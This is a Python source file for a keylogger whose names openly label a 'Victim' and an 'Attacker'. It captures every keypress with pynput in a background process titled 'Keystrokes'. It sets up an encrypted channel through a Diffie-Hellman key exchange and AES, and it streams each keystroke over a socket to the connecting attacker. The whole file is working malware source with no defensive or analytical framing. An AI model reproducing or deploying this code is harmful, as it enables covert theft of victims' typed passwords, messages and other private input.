from pynput.keyboard import Listener
import socket
import json
from packet import *
from dhaes import *
import multiprocessing
import setproctitle

def victim_socket(ADDRESS):
    setproctitle.setproctitle("Victim")
    VictimSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    VictimSocket.bind(ADDRESS)
    VictimSocket.listen()
    AttackerSocket, AttackerAddress = VictimSocket.accept()
    
    pga_packet = receive_packet(AttackerSocket)
    KEY = get_key(pga_packet,AttackerSocket)

    queue = multiprocessing.Queue()

    daemon = multiprocessing.Process(target=logger_deamon, args=(queue,))
    daemon.daemon = True
    daemon.start()

    
    while True:
        send_keystoke(AttackerSocket, queue.get(), KEY)


def logger_deamon(queue):
    setproctitle.setproctitle("Keystrokes")
    listener = Listener(on_press=lambda key: on_press(key, queue))
    listener.start()
    listener.join()  # Keep the listener running


def send_keystoke(client: socket.socket, keystroke: str, key: bytes):
    '''
    Send file compressed and encrypted with associated metadata 
    (Name and Nonce used for decryption)
    '''

    keystroke_enc, nonce= encrypt_mex(key,keystroke)
    
    data_packet = Packet(nonce, keystroke_enc)

    client.sendall(data_packet.raw_packet())

def get_key(pga_packet,AttackerSocket: socket.socket) -> bytes:
    #Unpack prime, generator and A
    pgA = json.loads(pga_packet.data)

    #Generate b, Calc B and send it
    b = rand()
    B = calcola(pgA['g'], b, pgA['p'])
    B_packet = Packet('BBACK', B)
    send_packet(AttackerSocket,B_packet)

    #Generate AES key based on DH
    K = calcolaK(pgA['A'],b,pgA['p'])
    Kb = str(K).encode('utf-8')

    return key_AES(Kb)

def on_press(key, queue):
    try:
        queue.put(format(key.char))
    except AttributeError:
        queue.put(format(key))
